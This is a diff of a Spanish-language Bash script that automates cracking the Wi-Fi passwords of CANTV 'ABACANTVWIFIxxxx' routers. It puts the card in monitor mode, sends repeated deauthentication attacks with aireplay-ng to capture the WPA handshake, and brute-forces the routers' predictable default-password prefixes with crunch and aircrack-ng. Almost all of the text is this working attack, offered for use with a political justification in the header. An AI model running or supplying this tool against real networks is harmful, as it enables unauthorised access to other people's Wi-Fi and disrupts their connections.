@@ -2,11 +2,9 @@
 # Este script hace uso de las contraseñas
 # por defecto en los routers ABACANTVWIFIxxxx Huawei Inc.
 # Escrito por @NyxZ3n, me hago responsable del uso del mismo
-# ante la dictadura todos somos responsables de hacer
-# un cambio por el país, CHÚPALO MADURO MARIPOSÓN. NO A LA DESINFORMACIÓN, 
+# Pues ante la dictadura, yo también soy responsable de hacer
+# un cambio por el país. NO A LA DESINFORMACIÓN, 
 # DEBEMOS ESTAR COMUNICADOS SIEMPRE.
-
-
 # CharsetDiccionario = 85047928%%%%%% ó 8504792%%%%%%%
 
 
@@ -14,7 +12,7 @@
 echo "¡ADVERTENCIA! Necesitas ser usuario root(superusuario) para correr el script"
 sleep 3
 
-HANDSHAKE="/root/Handshakes/HandShake.cap"
+HANDSHAKE="HandShake.cap"
 
 clear
 echo "------------------------------------------------"
@@ -22,8 +20,6 @@ echo "                Script by @NyxZ3n               "
 echo "                                                "
 echo "   BruteForce a contraseñas predeterminadas en  "
 echo "   routers ABACANTVWIFIxxxx                     "
-echo "                                                "
-echo "           No te quedes incomunicado!!!!        "
 echo "------------------------------------------------"
 echo ""
 echo "========Presiona enter para continuar========"
@@ -53,14 +49,19 @@ read WIRELESS
 [[ $WIRELESS == "" ]]
 clear
 echo "Empezando modo monitor con $WIRELESS..."
+echo ""
+echo ""
+sleep 1
+echo "Perderá su conexión previa durante el ataque."
 sudo ifconfig $WIRELESS down
 sudo iwconfig $WIRELESS mode monitor
 sudo ifconfig $WIRELESS up
-sleep 2
+sleep 3
 clear
 else
 echo ""
-echo "NO A LA DESINFORMACIÓN/DESCOMUNICACIÓN."
+echo "No hay nada que hacer."
+exit
 sleep 2
 clear
 fi
@@ -101,10 +102,12 @@ echo ""
 read DUMP
 if [[ $DUMP == 's' ]]; then
 echo ""
-echo "Escaneando redes [Ctrl-C para Detener]"
+echo "Al encontrar la red, presione CTRL + C."
 echo ""
-sleep 3
-sudo airodump-ng $WIRELESS
+echo "Routers: ABACANTVWIFIxxxx"
+echo "Manufacturer: Huawei Inc. ó ZTE"
+sleep 4
+sudo airodump-ng $WIRELESS --manufacturer
 else
 sleep 2
 clear
@@ -112,7 +115,6 @@ fi
 
 while true
 do
-clear
 echo "---------------------------------------------------------"
 echo "-       Capturar el Handshake[s/n]? (n Si ya realizado) -"
 echo "---------------------------------------------------------"
@@ -120,12 +122,7 @@ echo ""
 read HANDC
 
 if [[ $HANDC == 's' ]]; then
-echo ""
-echo "Creando directorio con Handshakes..."
-echo ""
 sleep 4
-sudo mkdir /root/Handshakes &> /dev/null
-echo "Directorio creado: /root/Handshakes"
 echo ""
 echo "Ingrese BSSID de la red (EJ: A1:F3:45:12:34:90):  "
 echo ""
@@ -137,19 +134,26 @@ echo ""
 read CHNEL
 [[ $CHNEL == "" ]]
 echo ""
-echo "-------------------------------------------------------------"
-echo "-Tiempo establecido de 60 segundos para captura de handshake-"
-echo "-------------------------------------------------------------"
-sleep 5
+echo "-------------------------------------------------------------------"
+echo "-Tiempo para captura de HandShake en segundos:  (120 recomendado)-"
+echo "-------------------------------------------------------------------"
+echo ""
+read TIEMPO1
+TIEMPO3=$(($TIEMPO1 + 2))
+SEGUNDOS='s'
+TIEMPO2=$TIEMPO1$SEGUNDOS
+sleep 2
 clear
-sudo timeout 60s airodump-ng --ig --manufacturer -w /root/Handshakes/HandShake -c $CHNEL --bssid $BSSID $WIRELESS & timeout 55s xterm -hold -e "while true; do sleep 5; sudo aireplay-ng -0 5 -q 2 --ig -a $BSSID $WIRELESS; done" & sleep 61; kill $!
+timeout $TIEMPO2 airodump-ng --ig -w HandShake -c $CHNEL --bssid $BSSID $WIRELESS --manufacturer & timeout $TIEMPO2 xterm -hold -e "while true; do sleep 5; sudo aireplay-ng -0 5 -q 2 --ig -a $BSSID $WIRELESS; done" & sleep $TIEMPO3; kill $!
 echo ""
 echo ""
 echo ""
 echo "Presiona enter."
 clear
 echo ""
-sudo mv /root/Handshakes/HandShake*.cap /root/Handshakes/HandShake.cap
+sudo mv HandShake*.cap HandShake.cap
+sudo rm HandShake*.csv
+sudo rm HandShake*.kismet.*
 clear
 else
 sleep 1
@@ -206,17 +210,13 @@ fi
 while true
 do
 clear
-echo "*****************************************************"
-echo "****************Selecciona una opción****************"
-echo "*****************************************************"
-echo "**                                                 **"
-echo "** 1. Ver handshakes             (Ctrl-C to exit)  **"
-echo "** 2. charset:85047928xxxxxx     (10 minutos aprox)**"
-echo "** 3. charset:8504792xxxxxxx     (1hora aprox)     **"
-echo "**                                                 **"
-echo "*****************************************************"
-echo "*****************************************************"
-echo "*****************************************************"
+echo "-------------------- Seleccione ---------------------"
+echo "--                                                 --"
+echo "-- 1. Ver handshakes             (Ctrl-C to exit  )--"
+echo "-- 2. Charset:85047928%%%%%%     (10 minutos aprox)--"
+echo "-- 3. Charset:8504792%%%%%%%     (1hora aprox     )--"
+echo "--                                                 --"
+echo "-----------------------------------------------------"
 echo ""
 
 read n
@@ -224,12 +224,11 @@ case $n in
 1)(xterm -hold -e sudo aircrack-ng $HANDSHAKE) & ;;
 
 2)clear
-echo "Empezando fuerza bruta de 6 dígitos numéricos."
+echo "Empezando fuerzabruta de 6 dígitos numéricos."
 echo ""
 echo "Por favor ingrese un nombre para el diccionario:"
 echo ""
 read DICCIONARIO
-[[DICCIONARIO == ""]]
 echo ""
 crunch 14 14 -t 85047928%%%%%% -o $DICCIONARIO
 echo ""
@@ -238,12 +237,11 @@ echo ""
 read -p "Presione cualquier tecla para volver.";;
 
 3)clear
-echo "Empezando fuerza bruta de 7 dígitos numéricos."
+echo "Empezando fuerzabruta de 7 dígitos numéricos."
 echo ""
 echo "Por favor ingrese un nombre para el diccionario:"
 echo ""
 read DICCIONARIO2
-[[DICCIONARIO2 == ""]]
 echo ""
 crunch 14 14 -t 8504792%%%%%%% -o $DICCIONARIO2
 echo""
@@ -251,10 +249,8 @@ sudo aircrack-ng -w $DICCIONARIO2 $HANDSHAKE
 echo ""
 read -p "Presione cualquier tecla para volver.";;
 
-
-
 *)clear
-echo "Opción Inválida"
+echo "Opción inválida"
 echo ""
 read -p "Presione cualquier tecla para volver.";;
 
